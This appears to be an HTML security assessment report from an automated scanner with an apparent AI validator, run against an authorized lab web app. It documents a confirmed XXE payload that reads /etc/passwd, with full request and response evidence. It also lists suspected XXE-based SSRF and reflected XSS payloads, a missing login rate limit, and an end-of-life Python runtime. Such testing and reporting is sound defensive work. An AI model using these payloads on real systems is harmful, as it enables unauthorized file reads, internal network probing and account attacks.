@@ -1,0 +1,331 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr0s8uo3-rbw2ac</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#d32f2f">HIGH</span> [path-traversal] XXE in SOAP /soap_service (account_id) — arbitrary local file read (/etc/passwd)</a></li>
+</ul></li>
+<li><a href="#suspected">Suspected (needs manual verification)</a><ul>
+<li><a href="#finding-2">2. <span class="sev" style="color:#f57c00">MEDIUM</span> [ssrf] XXE-based SSRF in SOAP /soap_service (external entity outbound fetch)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [vulnerable-component] End-of-life Python 3.8.20 runtime (EOL 2024-10-07, no further security patches)</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#c9a227">LOW</span> [xss-reflected] Unescaped account_id reflection into innerHTML sink (potential reflected XSS) on dashboard SOAP response</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#c9a227">LOW</span> [rate-limit] No rate-limiting / account lockout on login (brute-force &amp; credential stuffing)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr0s8uo3-rbw2ac</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32810/</code></td></tr>
+<tr><td>Started</td><td>2026-06-30T15:09:35.663Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>2 mapped · 2 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>1</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32810</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>1 finding(s)</p><p class="sumtags"><span><b style="color:#d32f2f">1</b> high</span></p>
+<p class="muted">Plus <b>4</b> suspected lead(s) needing manual verification (listed separately, not counted above).</p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 1. [path-traversal] XXE in SOAP /soap_service (account_id) — arbitrary local file read (/etc/passwd)</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32810/</div>
+<div class="desc">XXE: the POST /soap_service endpoint parses raw XML request bodies without disabling external entities. A DOCTYPE defining an external SYSTEM entity (file:///etc/passwd) referenced inside the &lt;account_id&gt; element is resolved by the XML parser, and its contents are reflected verbatim in the &lt;account_id&gt; field of the GetAccountInfoResponse — yielding arbitrary local file read on the server. Because the SOAP response is also rendered into the dashboard via innerHTML, leaked content is additionally displayed in the browser. An attacker can read sensitive files (app source, config, secrets) and pivot to SSRF via other URI schemes (http://).</div>
+<div><b>Reproduction</b></div><pre>POST http://target.local:32810/soap_service with Content-Type: application/xml and body:
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;GetAccountInfoRequest&gt;&lt;account_id&gt;&amp;xxe;&lt;/account_id&gt;&lt;/GetAccountInfoRequest&gt;
+The response's &lt;account_id&gt; field contains the full /etc/passwd (root:x:0:0:...). Negative control (ev-mr0sddc2-9): same request with account_id=123456 returns only normal account data, no file contents. Positive replays ev-mr0sdwdz-b / ev-mr0sdxsa-c both leak /etc/passwd.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0sddc2-9</code> — <code>artifacts/s-0001/ev-mr0sddc2-9/</code></div><div class="lbl">REQUEST</div><pre>POST /soap_service HTTP/1.1
+Host: target.local:32810
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/xml
+
+&lt;GetAccountInfoRequest&gt;&lt;account_id&gt;123456&lt;/account_id&gt;&lt;/GetAccountInfoRequest&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 307
+content-type: application/xml; charset=utf-8
+date: Tue, 30 Jun 2026 15:13:06 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+
+            &lt;GetAccountInfoResponse&gt;
+                &lt;account_id&gt;123456&lt;/account_id&gt;
+                &lt;balance&gt;1000 USD&lt;/balance&gt;
+                &lt;recent_transactions&gt;Transaction1&lt;/recent_transactions&gt;&lt;recent_transactions&gt;Transaction2&lt;/recent_transactions&gt;
+            &lt;/GetAccountInfoResponse&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0sdwdz-b</code> — <code>artifacts/s-0001/ev-mr0sdwdz-b/</code></div><div class="lbl">REQUEST</div><pre>POST /soap_service HTTP/1.1
+Host: target.local:32810
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/xml
+
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;GetAccountInfoRequest&gt;&lt;account_id&gt;&amp;xxe;&lt;/account_id&gt;&lt;/GetAccountInfoRequest&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1140
+content-type: application/xml; charset=utf-8
+date: Tue, 30 Jun 2026 15:13:30 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+
+            &lt;GetAccountInfoResponse&gt;
+                &lt;account_id&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+&lt;/account_id&gt;
+                &lt;balance&gt;1000 USD&lt;/balance&gt;
+                &lt;recent_transactions&gt;Transaction1&lt;/recent_transactions&gt;&lt;recent_transactions&gt;Transaction2&lt;/recent_transactions&gt;
+            &lt;/GetAccountInfoResponse&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0sdxsa-c</code> — <code>artifacts/s-0001/ev-mr0sdxsa-c/</code></div><div class="lbl">REQUEST</div><pre>POST /soap_service HTTP/1.1
+Host: target.local:32810
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/xml
+
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;GetAccountInfoRequest&gt;&lt;account_id&gt;&amp;xxe;&lt;/account_id&gt;&lt;/GetAccountInfoRequest&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1140
+content-type: application/xml; charset=utf-8
+date: Tue, 30 Jun 2026 15:13:32 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+
+            &lt;GetAccountInfoResponse&gt;
+                &lt;account_id&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+&lt;/account_id&gt;
+                &lt;balance&gt;1000 USD&lt;/balance&gt;
+                &lt;recent_transactions&gt;Transaction1&lt;/recent_transactions&gt;&lt;recent_transactions&gt;Transaction2&lt;/recent_transactions&gt;
+            &lt;/GetAccountInfoResponse&gt;</pre></div>
+</div>
+<h2 id="suspected">Suspected (needs manual verification)</h2>
+<p class="muted">Leads with one concrete anomaly but without control+2-replay confirmation — verify before relying on them.</p>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#f57c00">MEDIUM</span> 2. [ssrf] XXE-based SSRF in SOAP /soap_service (external entity outbound fetch)</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32810/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> XXE external-entity processing is confirmed (file:///etc/passwd read in ev-mr0sdwdz-b), so the parser resolves attacker-controlled SYSTEM URIs; an http:// entity should yield SSRF, but no Collaborator callback arrived within 35s — the isolated lab host appears to have no outbound internet egress, leaving OOB unconfirmable here despite the primitive being present.</div>
+<div class="desc">The same XXE flaw (f-001) resolves attacker-supplied SYSTEM URIs. file:// resolution is proven (leaked /etc/passwd), which means an http:// SYSTEM entity should force the server to make outbound requests to an attacker-chosen host (SSRF) — usable to reach internal services or cloud metadata. I could not observe a Burp Collaborator DNS/HTTP callback (20s and 35s waits both empty), almost certainly because this isolated lab host (target.local) has no outbound internet egress to the Collaborator domain, not because the sink is filtered.</div>
+<div><b>Reproduction</b></div><pre>POST http://target.local:32810/soap_service, Content-Type application/xml, body:
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;http://INTERNAL-HOST/&quot;&gt;]&gt;&lt;GetAccountInfoRequest&gt;&lt;account_id&gt;&amp;xxe;&lt;/account_id&gt;&lt;/GetAccountInfoRequest&gt;
+On a host with egress, the server fetches the URL. file:// variant already confirmed external-entity resolution (ev-mr0sdwdz-b). To verify in this environment, point the entity at a reachable internal host/port and observe differential timing/response, or run probe_oob from a network with egress.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0sdwdz-b</code> — <code>artifacts/s-0001/ev-mr0sdwdz-b/</code></div><div class="lbl">REQUEST</div><pre>POST /soap_service HTTP/1.1
+Host: target.local:32810
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/xml
+
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;GetAccountInfoRequest&gt;&lt;account_id&gt;&amp;xxe;&lt;/account_id&gt;&lt;/GetAccountInfoRequest&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1140
+content-type: application/xml; charset=utf-8
+date: Tue, 30 Jun 2026 15:13:30 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+
+            &lt;GetAccountInfoResponse&gt;
+                &lt;account_id&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+&lt;/account_id&gt;
+                &lt;balance&gt;1000 USD&lt;/balance&gt;
+                &lt;recent_transactions&gt;Transaction1&lt;/recent_transactions&gt;&lt;recent_transactions&gt;Transaction2&lt;/recent_transactions&gt;
+            &lt;/GetAccountInfoResponse&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#f57c00">MEDIUM</span> 3. [vulnerable-component] End-of-life Python 3.8.20 runtime (EOL 2024-10-07, no further security patches)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32810/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> Server header on every response reads `Werkzeug/3.0.6 Python/3.8.20`. Python 3.8 reached end-of-life on 2024-10-07 and 3.8.20 was its final release — the CPython runtime now receives no security patches, so any stdlib CVE disclosed after EOL (e.g. in http/ssl/xml/tarfile parsers) stays permanently unpatched here. Version/banner-based; not actively exploited.</div>
+<div class="desc">The application runs on Python 3.8.20, exposed via the `Server: Werkzeug/3.0.6 Python/3.8.20` response header on all endpoints (/, /login, /dashboard, /soap_service). Python 3.8 is end-of-life as of 2024-10-07; 3.8.20 (Sept 2024) was the last release of the branch. No upstream security fixes will be issued for this runtime going forward, so the deployment will accrue unpatched CPython vulnerabilities over time and cannot be remediated except by upgrading to a supported branch (3.12/3.13+). This is a version-based / EOL determination, not an actively confirmed exploit. Remediation: migrate to a currently supported Python release.</div>
+<div><b>Reproduction</b></div><pre>1. Send any request, e.g. `GET http://target.local:32810/login`.
+2. Inspect the response `Server` header: `Werkzeug/3.0.6 Python/3.8.20`.
+3. Cross-reference Python release lifecycle: 3.8 EOL = 2024-10-07; 3.8.20 is the final 3.8.x release. No further security maintenance.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0ss2pu-1p</code> — <code>artifacts/_/ev-mr0ss2pu-1p/</code></div><div class="lbl">REQUEST</div><pre>GET /login HTTP/1.1
+Host: target.local:32810
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 560
+content-type: text/html; charset=utf-8
+date: Tue, 30 Jun 2026 15:24:32 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h2&gt;Login&lt;/h2&gt;
+        &lt;form method=&quot;post&quot; action=&quot;/login&quot;&gt;
+            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;
+            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
+            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;
+            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
+            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#c9a227">LOW</span> 4. [xss-reflected] Unescaped account_id reflection into innerHTML sink (potential reflected XSS) on dashboard SOAP response</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32810/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> account_id is reflected UNESCAPED in the SOAP response (raw &lt;b&gt;xss&lt;/b&gt; echoed, ev-mr0sf9ug-f) and the dashboard assigns that response to innerHTML, a real DOM XSS sink; but account_id is hardcoded to 123456 with no attacker-controlled URL→body path, so cross-user execution could not be delivered or auto-confirmed this run.</div>
+<div class="desc">The SOAP service reflects the request's account_id verbatim/unescaped in the GetAccountInfoResponse (verified: input AMR&lt;b&gt;xss&lt;/b&gt;CHK returned with raw &lt;b&gt; tags, ev-mr0sf9ug-f). The dashboard JS (loadInfo) fetches this response and assigns it directly to element.innerHTML, so an injected &lt;img src=x onerror=...&gt; in account_id would execute when rendered. The combination is a genuine client-side XSS sink. However, the dashboard hardcodes account_id=123456 and exposes no attacker-controlled URL parameter that flows into the SOAP body, so a cross-user delivery vector could not be established within the app; probe_xss could not auto-confirm execution (response is application/xml, not text/html). Recorded as a lead — the unescaped reflection + innerHTML sink is a real defect worth a code-level fix (escape SOAP response data / avoid innerHTML).</div>
+<div><b>Reproduction</b></div><pre>POST http://target.local:32810/soap_service, Content-Type application/xml, body:
+&lt;GetAccountInfoRequest&gt;&lt;account_id&gt;AMR&lt;b&gt;xss&lt;/b&gt;CHK&lt;/account_id&gt;&lt;/GetAccountInfoRequest&gt;
+Response echoes &lt;account_id&gt;AMR&lt;b&gt;xss&lt;/b&gt;CHK&lt;/account_id&gt; with raw HTML (ev-mr0sf9ug-f). Dashboard JS does document.getElementById('accountInfo').innerHTML = data, so an onerror payload would fire in the browser. Negative control: account_id=123456 returns escaped/benign content (ev-mr0sddc2-9).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0sf9ug-f</code> — <code>artifacts/s-0001/ev-mr0sf9ug-f/</code></div><div class="lbl">REQUEST</div><pre>POST /soap_service HTTP/1.1
+Host: target.local:32810
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/xml
+
+&lt;GetAccountInfoRequest&gt;&lt;account_id&gt;AMR&amp;lt;b&amp;gt;xss&amp;lt;/b&amp;gt;CHK&lt;/account_id&gt;&lt;/GetAccountInfoRequest&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 317
+content-type: application/xml; charset=utf-8
+date: Tue, 30 Jun 2026 15:14:34 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+
+            &lt;GetAccountInfoResponse&gt;
+                &lt;account_id&gt;AMR&lt;b&gt;xss&lt;/b&gt;CHK&lt;/account_id&gt;
+                &lt;balance&gt;1000 USD&lt;/balance&gt;
+                &lt;recent_transactions&gt;Transaction1&lt;/recent_transactions&gt;&lt;recent_transactions&gt;Transaction2&lt;/recent_transactions&gt;
+            &lt;/GetAccountInfoResponse&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#c9a227">LOW</span> 5. [rate-limit] No rate-limiting / account lockout on login (brute-force &amp; credential stuffing)</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32810/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> 13 consecutive failed POST /login attempts for user 'john' all returned an immediate identical 401 'Invalid credentials' with zero throttling: no lockout, no CAPTCHA, no progressive delay, no 429/Retry-After header. The endpoint imposes no rate limit on authentication, enabling unlimited brute-force / credential-stuffing attacks.</div>
+<div class="desc">The POST /login endpoint applies no anti-automation controls. Across 13+ consecutive failed authentication attempts for the same account ('john') — mixing wrong passwords and SQLi payloads — every request was processed immediately and returned the same 401 'Invalid credentials' with no account lockout, no progressive delay, no CAPTCHA, and no 429/Retry-After. This leaves the login open to unrestricted password brute-forcing and credential stuffing.</div>
+<div><b>Reproduction</b></div><pre>Send POST /login (application/x-www-form-urlencoded, body username=john&amp;password=&lt;guess&gt;) repeatedly in rapid succession with varying passwords. Observed: every attempt returns 401 'Invalid credentials' instantly; no lockout/throttle/CAPTCHA appears after 13+ failures (evidence ev-mr0sm6p9-16 .. ev-mr0smax1-1a plus earlier attempts).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0smax1-1a</code> — <code>artifacts/s-0002/ev-mr0smax1-1a/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32810
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+
+username=john&amp;password=brute5</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 401
+connection: close
+content-length: 19
+content-type: text/html; charset=utf-8
+date: Tue, 30 Jun 2026 15:20:02 GMT
+server: Werkzeug/3.0.6 Python/3.8.20
+
+Invalid credentials</pre></div>
+</div>
+</body></html>
